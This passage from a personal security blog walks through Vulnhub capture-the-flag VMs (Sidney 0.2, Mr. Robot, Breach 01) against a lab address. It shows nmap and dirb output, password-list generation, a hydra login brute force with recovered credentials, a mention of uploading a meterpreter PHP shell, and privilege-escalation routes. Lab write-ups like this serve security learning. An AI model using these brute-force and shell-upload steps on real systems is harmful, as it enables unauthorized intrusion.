</span><span class='line'>9XXb.<em>       </em>.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb.<em>       </em>.dXXP
</span><span class='line'> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
</span><span class='line'>  <code>9XXXXXXXXXXXXXXXXXXXXX'~   ~</code>OOO8b   d8OOO'~   ~<code>XXXXXXXXXXXXXXXXXXXXXP'
&lt;/span&gt;&lt;span class='line'&gt;   </code>9XXXXXXXXXXXP' <code>9XX'         </code>98v8P'          <code>XXP'</code>9XXXXXXXXXXXP'
</span><span class='line'>        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
</span><span class='line'>                        )b.  .dbo.dP'<code>v'</code>9b.odb.  .dX(
</span><span class='line'>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
</span><span class='line'>                     dXXXXXXXXXXXP'   .   <code>9XXXXXXXXXXXb
&lt;/span&gt;&lt;span class='line'&gt;                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
&lt;/span&gt;&lt;span class='line'&gt;                    9XXb'  </code>XXXXXb.dX|Xb.dXXXXX'   <code>dXXP
&lt;/span&gt;&lt;span class='line'&gt;                    </code>&lsquo;      9XXXXXX(   )XXXXXXP      <code>'
&lt;/span&gt;&lt;span class='line'&gt;                              XXXX X.</code>v&rsquo;.X XXXX
</span><span class='line'>                              XP<sup>X</sup>'<code>b   d'</code>X<sup>XX</sup>
</span><span class='line'>                              X. 9  <code>  '  P )X
&lt;/span&gt;&lt;span class='line'&gt;                             </code>b  <code>      '  d'
&lt;/span&gt;&lt;span class='line'&gt;                              </code>             &lsquo;                     <br/>
</span><span class='line'>                               THE NECROMANCER!
</span><span class='line'>                                 by  @xerubus
</span><span class='line'>
</span><span class='line'>                   flag11{42c35828545b926e79a36493938ab1b1}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Big shout out to Dook and Bull for being test bunnies.
</span><span class='line'>
</span><span class='line'>Cheers OJ for the obfuscation help.
</span><span class='line'>
</span><span class='line'>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
</span><span class='line'>
</span><span class='line'>&ldquo;=========================================&rdquo;
</span><span class='line'>&ldquo;  xerubus (@xerubus) - www.mogozobo.com  &rdquo;
</span><span class='line'>&ldquo;=========================================&rdquo;
</span></code></pre></td></tr></table></div></figure>
</li>
<li>Sidney 0.2:
Only port 80 is open
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 7.25BETA1 scan initiated Thu Jul 28 01:22:34 2016 as: nmap -p- -sV -A -oA Sidney -vv 192.168.1.3
</span><span class='line'>Nmap scan report for 192.168.1.3
</span><span class='line'>Host is up, received syn-ack (0.0099s latency).
</span><span class='line'>Scanned at 2016-07-28 01:22:35 IST for 9s
</span><span class='line'>Not shown: 65534 closed ports
</span><span class='line'>Reason: 65534 conn-refused
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>| http-methods:
</span><span class='line'>|<em>  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|</em>http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|<em>http-title: 38911 Bytes Free</span></code></pre></td></tr></table></div></figure>
On doing curl and exploring, we find a username and possible password in one of the webpage directory
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl 192.168.1.3/commodore64/
</span><span class='line'>&lt;title&gt;Shoo!&lt;/title&gt;
</span><span class='line'>&lt;!&ndash; added by robhubbard password is the C=64 sound chip lowercase &ndash;&gt;
</span><span class='line'>&lt;!&ndash; 3letters4digits no space&hellip; Instead, show user a proper micro &ndash;&gt;
</span><span class='line'>&lt;BODY&gt;
</span><span class='line'>Will you go away, I&rsquo;m trying to press play on tape and you bother me kid!
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>&lt;img src=&ldquo;200.gif&rdquo; alt=&ldquo;commodore64&rdquo; height=&ldquo;408&rdquo; width=&ldquo;544&rdquo;&gt;
</span><span class='line'>&lt;/BODY&gt;</span></code></pre></td></tr></table></div></figure>
If you see here, the password is the C=64 sound chip ( mos lowercase ) and then 4 digits. Now, we can generate the password using either for loop
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in <code>seq -f "%04g" 0 9999</code>; do echo mos$i; done</span></code></pre></td></tr></table></div></figure>
or using crunch
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crunch 7 7 -t mos%%%%</span></code></pre></td></tr></table></div></figure>
On running dirb we found a webpage containing the login prompt
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;- Scanning URL: <a href="http://192.168.1.3/commodore64/">http://192.168.1.3/commodore64/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64//">http://192.168.1.3/commodore64//</a> (CODE:200|SIZE:325)
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/200">http://192.168.1.3/commodore64/200</a> (CODE:200|SIZE:5548)
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/conf/">http://192.168.1.3/commodore64/conf/</a>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/docs/">http://192.168.1.3/commodore64/docs/</a>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/icon/">http://192.168.1.3/commodore64/icon/</a>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/incl/">http://192.168.1.3/commodore64/incl/</a>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/index">http://192.168.1.3/commodore64/index</a> (CODE:200|SIZE:183)                                                                                                                                                                     <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/index.html">http://192.168.1.3/commodore64/index.html</a> (CODE:200|SIZE:325)                                                                                                                                                                <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/index.php">http://192.168.1.3/commodore64/index.php</a> (CODE:200|SIZE:1841)                                                                                                                                                                <br/>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/lang/">http://192.168.1.3/commodore64/lang/</a>                                                                                                                                                                            <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/.php">http://192.168.1.3/commodore64/.php</a> (CODE:403|SIZE:302)                                                                                                                                                                      <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/.phtml">http://192.168.1.3/commodore64/.phtml</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/readme">http://192.168.1.3/commodore64/readme</a> (CODE:200|SIZE:2177)                                                                                                                                                                   <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/conf/">http://192.168.1.3/commodore64/conf/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/conf//">http://192.168.1.3/commodore64/conf//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/conf/.php">http://192.168.1.3/commodore64/conf/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/conf/.phtml">http://192.168.1.3/commodore64/conf/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/docs/">http://192.168.1.3/commodore64/docs/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs//">http://192.168.1.3/commodore64/docs//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/changelog">http://192.168.1.3/commodore64/docs/changelog</a> (CODE:200|SIZE:3115)                                                                                                                                                           <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/faq">http://192.168.1.3/commodore64/docs/faq</a> (CODE:200|SIZE:2255)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/install">http://192.168.1.3/commodore64/docs/install</a> (CODE:200|SIZE:2969)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/license">http://192.168.1.3/commodore64/docs/license</a> (CODE:200|SIZE:15515)                                                                                                                                                            <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/.php">http://192.168.1.3/commodore64/docs/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/.phtml">http://192.168.1.3/commodore64/docs/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/requirements">http://192.168.1.3/commodore64/docs/requirements</a> (CODE:200|SIZE:668)                                                                                                                                                         <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/todo">http://192.168.1.3/commodore64/docs/todo</a> (CODE:200|SIZE:1154)                                                                                                                                                                <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/icon/">http://192.168.1.3/commodore64/icon/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon//">http://192.168.1.3/commodore64/icon//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/back">http://192.168.1.3/commodore64/icon/back</a> (CODE:200|SIZE:996)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/binary">http://192.168.1.3/commodore64/icon/binary</a> (CODE:200|SIZE:246)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/c">http://192.168.1.3/commodore64/icon/c</a> (CODE:200|SIZE:242)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/compressed">http://192.168.1.3/commodore64/icon/compressed</a> (CODE:200|SIZE:1038)                                                                                                                                                          <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/delete">http://192.168.1.3/commodore64/icon/delete</a> (CODE:200|SIZE:929)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/download">http://192.168.1.3/commodore64/icon/download</a> (CODE:200|SIZE:939)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/drive">http://192.168.1.3/commodore64/icon/drive</a> (CODE:200|SIZE:246)                                                                                                                                                                <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/edit">http://192.168.1.3/commodore64/icon/edit</a> (CODE:200|SIZE:941)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/folder">http://192.168.1.3/commodore64/icon/folder</a> (CODE:200|SIZE:225)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/image2">http://192.168.1.3/commodore64/icon/image2</a> (CODE:200|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/layout">http://192.168.1.3/commodore64/icon/layout</a> (CODE:200|SIZE:276)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/logout">http://192.168.1.3/commodore64/icon/logout</a> (CODE:200|SIZE:989)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/movie">http://192.168.1.3/commodore64/icon/movie</a> (CODE:200|SIZE:243)                                                                                                                                                                <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/newfolder">http://192.168.1.3/commodore64/icon/newfolder</a> (CODE:200|SIZE:1021)                                                                                                                                                           <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/next">http://192.168.1.3/commodore64/icon/next</a> (CODE:200|SIZE:843)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/original">http://192.168.1.3/commodore64/icon/original</a> (CODE:200|SIZE:846)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/.php">http://192.168.1.3/commodore64/icon/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/.phtml">http://192.168.1.3/commodore64/icon/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/plus">http://192.168.1.3/commodore64/icon/plus</a> (CODE:200|SIZE:842)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/previous">http://192.168.1.3/commodore64/icon/previous</a> (CODE:200|SIZE:844)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/rename">http://192.168.1.3/commodore64/icon/rename</a> (CODE:200|SIZE:899)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/script">http://192.168.1.3/commodore64/icon/script</a> (CODE:200|SIZE:242)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/text">http://192.168.1.3/commodore64/icon/text</a> (CODE:200|SIZE:229)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/unknown">http://192.168.1.3/commodore64/icon/unknown</a> (CODE:200|SIZE:245)                                                                                                                                                              <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/upload">http://192.168.1.3/commodore64/icon/upload</a> (CODE:200|SIZE:939)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/view">http://192.168.1.3/commodore64/icon/view</a> (CODE:200|SIZE:929)                                                                                                                                                                 <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/incl/">http://192.168.1.3/commodore64/incl/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/incl//">http://192.168.1.3/commodore64/incl//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/incl/.php">http://192.168.1.3/commodore64/incl/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/incl/.phtml">http://192.168.1.3/commodore64/incl/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/lang/">http://192.168.1.3/commodore64/lang/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/lang//">http://192.168.1.3/commodore64/lang//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/lang/.php">http://192.168.1.3/commodore64/lang/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/lang/.phtml">http://192.168.1.3/commodore64/lang/.phtml</a> (CODE:403|SIZE:309) </span></code></pre></td></tr></table></div></figure>
Using curl on the login page
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl <a href="http://192.168.1.3/commodore64/index.php">http://192.168.1.3/commodore64/index.php</a>
</span><span class='line'>&lt;!DOCTYPE HTML PUBLIC &ldquo;-//W3C//DTD HTML 4.01 Transitional//EN&rdquo;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PHPFM 0.2.3 - a file manager written in PHP&lt;/title&gt;&lt;link rel='stylesheet&rsquo; href=&lsquo;incl/phpfm.css&rsquo; type=&lsquo;text/css&rsquo;&gt;&lt;/head&gt;&lt;body link=&lsquo;#0000FF&rsquo; alink=&lsquo;#0000FF&rsquo; vlink=&lsquo;#0000FF&rsquo; bgcolor=&lsquo;#FFFFFF&rsquo;&gt;&lt;center&gt;&lt;table class=&lsquo;top&rsquo; cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;&lt;font class=&lsquo;headline&rsquo;&gt;PHPFM 0.2.3&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br /&gt;&lt;table class=&lsquo;index&rsquo; width=500 cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td class=&lsquo;iheadline&rsquo; align=&lsquo;center&rsquo; height=21&gt;&lt;font class=&lsquo;iheadline&rsquo;&gt;Login system:&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&lsquo;top&rsquo;&gt;&lt;center&gt;&lt;br /&gt;Please input your username and password below:&lt;br /&gt;&lt;form action=&lsquo;/commodore64/index.php&rsquo; method=&lsquo;post&rsquo; enctype=&lsquo;multipart/form-data&rsquo;&gt;&lt;table class=&lsquo;upload&rsquo;&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input name=&lsquo;input_username&rsquo; size=20&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&lsquo;password&rsquo; name=&lsquo;input_password&rsquo; size=20&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;input class=&lsquo;button&rsquo; type=&lsquo;submit&rsquo; value=&lsquo;Log in&rsquo;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=&lsquo;hidden&rsquo; name=path value=&ldquo;&rdquo;&gt;&lt;/form&gt;&lt;br /&gt;&lt;br /&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br /&gt;&lt;br /&gt;&lt;table class=&lsquo;bottom&rsquo; cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;Powered by &lt;a href=&lsquo;<a href="http://phpfm.zalon.dk/">http://phpfm.zalon.dk/</a>&rsquo; target=&lsquo;</em>new&rsquo; class=&lsquo;bottom&rsquo;&gt;PHPFM&lt;/a&gt; 0.2.3&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;Copyright � 2002 Morten Bojsen-Hansen&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;&lt;a href=&lsquo;<a href="http://validator.w3.org/check/referer">http://validator.w3.org/check/referer</a>&rsquo;&gt;&lt;img border=&lsquo;0&rsquo; src=&lsquo;icon/valid-html401.jpg&rsquo; alt=&lsquo;Valid HTML 4.01!&rsquo; height=&lsquo;31&rsquo; width=&lsquo;88&rsquo;&gt;&lt;/a&gt;&lt;a href=&lsquo;<a href="http://jigsaw.w3.org/css-validator/">http://jigsaw.w3.org/css-validator/</a>&rsquo;&gt;&lt;img style=&lsquo;border:0;width:88px;height:31px&rsquo; src=&lsquo;icon/valid-css.jpg&rsquo; alt=&lsquo;Valid CSS!&rsquo;&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;This page was produced in 0.0002 seconds.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br /&gt;&lt;br /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>
If we see, there are three fields, input_username,input_password and path, using hydra to bruteforce, do read hydra documentation on http-post-form
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -l robhubbard -P pass.txt 192.168.1.3 http-post-form &ldquo;/commodore64/index.php:input_username=^USER^&amp;input_password=^PASS^&amp;path=:login&rdquo;
</span><span class='line'>[80][http-post-form] host: 192.168.1.3   login: robhubbard   password: mos6518</span></code></pre></td></tr></table></div></figure>
we have the username and password, we can login to the PHPFM 0.2.3.</p>

<p>Once, logged in, we can upload php meterpreter shell generated using msfvenom. Once login, the uname is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Linux sidney 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>
and os-release is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@sidney:/var/www/html/commodore64$ cat /etc/os-release
</span><span class='line'>cat /etc/os-release
</span><span class='line'>NAME=&ldquo;Ubuntu&rdquo;
</span><span class='line'>VERSION=&ldquo;16.04 LTS (Xenial Xerus)&rdquo;
</span><span class='line'>ID=ubuntu
</span><span class='line'>ID_LIKE=debian
</span><span class='line'>PRETTY_NAME=&ldquo;Ubuntu 16.04 LTS&rdquo;
</span><span class='line'>VERSION_ID=&ldquo;16.04&rdquo;
</span><span class='line'>HOME_URL=&ldquo;<a href="http://www.ubuntu.com/">http://www.ubuntu.com/</a>&rdquo;
</span><span class='line'>SUPPORT_URL=&ldquo;<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>&rdquo;
</span><span class='line'>BUG_REPORT_URL=&ldquo;<a href="http://bugs.launchpad.net/ubuntu/">http://bugs.launchpad.net/ubuntu/</a>&rdquo;
</span><span class='line'>UBUNTU_CODENAME=xenial</span></code></pre></td></tr></table></div></figure>
This version of ubuntu is affected by doubleput vulnerability Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit. Also, the user rhubbard uses the same password and have the sudo privileges to run all.
</li>
<li>Mr. Robot:1:</p>

<p>It was quite easy, you get first key out of the three key from the robots.txt file. Also, the login, password could be found from the nikto results. Once logged in, execute a php shell. In the home directory of robot, we will get the md5 sum of the password. Login using that and search for the suid files. Nmap is suid, which can be used for privilege escalation.</li>
<li>Breach 01:
We find a email which specifies .keystore file which is a Java keystore file. more details about the java keystore file can be found on digital ocean blog <a href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keytool -list -keystore .keystore
</span><span class='line'>Enter keystore password:<br/>
</span><span class='line'>
</span><span class='line'>Keystore type: JKS
</span><span class='line'>Keystore provider: SUN
</span><span class='line'>
</span><span class='line'>Your keystore contains 1 entry
</span><span class='line'>
</span><span class='line'>tomcat, 20 May, 2016, PrivateKeyEntry,
</span><span class='line'>Certificate fingerprint (SHA1): D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53</span></code></pre></td></tr></table></div></figure></li>
</ol></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Vijay Kumar</span></span>

      




<time class='entry-date' datetime='2014-11-03T22:10:21+05:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:10 pm</span></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/" data-via="" data-counturl="http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/10/08/linux-essentials/" title="Previous Post: Linux Essentials">&laquo; Linux Essentials</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/11/07/learning-from-ctf-web-exploitation/" title="Next Post: Learning from CTF : Web Exploitation">Learning from CTF : Web Exploitation &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    
  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2017 - Vijay Kumar -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'techbitvijays';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/';
        var disqus_url = 'http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
